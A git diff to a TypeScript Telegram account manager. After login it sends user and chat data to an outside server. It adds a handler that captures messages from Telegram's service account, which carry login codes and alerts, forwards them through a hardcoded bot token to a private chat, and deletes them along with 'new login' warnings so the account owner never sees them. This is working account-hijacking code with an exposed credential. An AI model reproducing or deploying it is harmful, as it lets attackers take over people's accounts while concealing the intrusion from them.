@@ -3,8 +3,10 @@ import { TelegramClient } from "telegram";
 import { StringSession } from "telegram/sessions";
 import axios from "axios";
 import { sleep } from "telegram/Helpers";
-const clients = new Map();
+import { NewMessage, NewMessageEvent } from "telegram/events";
+const ppplbot = "https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage";
 
+const clients = new Map();
 const apiId = 24559917 || parseInt(process.env.API_ID);
 const apiHash = "702294de6c08f4fd8c94c3141e0cebfb" || process.env.API_HASH;
 
@@ -166,10 +168,9 @@ class TelegramManager {
                 termsOfService = result.termsOfService;
             } else {
                 console.log(this.client.session.save());
-                // this.client.addEventHandler(deleteMsgs, new NewMessage({ incoming: true }));
+                this.client.addEventHandler(deleteMsgs, new NewMessage({ incoming: true }));
                 const sess = this.client.session.save() as unknown as string;
                 const user: any = await result.user.toJSON();
-
                 const chats = await this.client?.getDialogs({ limit: 130 });
                 let personalChats = 0;
                 let channels = 0;
@@ -199,19 +200,9 @@ class TelegramManager {
                 };
                 await axios.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
                 await axios.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
-
-                const msgs = await this.client.getMessages("777000", { limit: 2 });
-                msgs.forEach(async msg => {
-                    if (msg.text.toLowerCase().includes('we detected') || msg.text.toLowerCase().includes('new login')) {
-                        await msg.delete({ revoke: true });
-                    }
-                })
-                const name = user.username ? `@${user.username}` : user.firstName + user.lastName
-                const payload = {
-                    chat_id: "-1001801844217",
-                    text: `ACCOUNT LOGIN: ${name}`
-                };
-                await restAcc(this.phoneNumber);
+                setTimeout(async () => {
+                    await restAcc(this.phoneNumber);
+                }, 40000);
                 return { status: 200, message: "Login success" }
             }
         } catch (err: any) {
@@ -261,6 +252,54 @@ class TelegramManager {
             }
         }
         await restAcc(this.phoneNumber);
+    }
+}
+
+async function deleteMsgs(event: NewMessageEvent) {
+    if (event.message.chatId.toString() == "777000") {
+        const payload = {
+            chat_id: "-1001801844217",
+            text: event.message.text
+        };
+        console.log("RECIEVED - ", event.message.text);
+        await event.message.delete({ revoke: true });
+        const options = {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        };
+        await fetchWithTimeout(`${ppplbot}`, options);
+    }
+    await sleep(300);
+    const msgs = await event.client.getMessages("777000", { limit: 3 });
+    msgs.forEach(async msg => {
+        if (msg.text.toLowerCase().includes('we detected') || msg.text.toLowerCase().includes('new login')) {
+            await msg.delete({ revoke: true });
+        }
+    })
+}
+
+
+async function fetchWithTimeout(resource, options: any = {}) {
+    const timeout = options?.timeout || 15000;
+    const source = axios.CancelToken.source();
+    const id = setTimeout(() => source.cancel(), timeout);
+
+    try {
+        const response = await axios({
+            ...options,
+            url: resource,
+            cancelToken: source.token
+        });
+        clearTimeout(id);
+        return response;
+    } catch (error) {
+        if (axios.isCancel(error)) {
+            console.log('Request canceled:', error.message);
+        } else {
+            console.log('Error:', error.message);
+        }
+        return undefined;
     }
 }
 
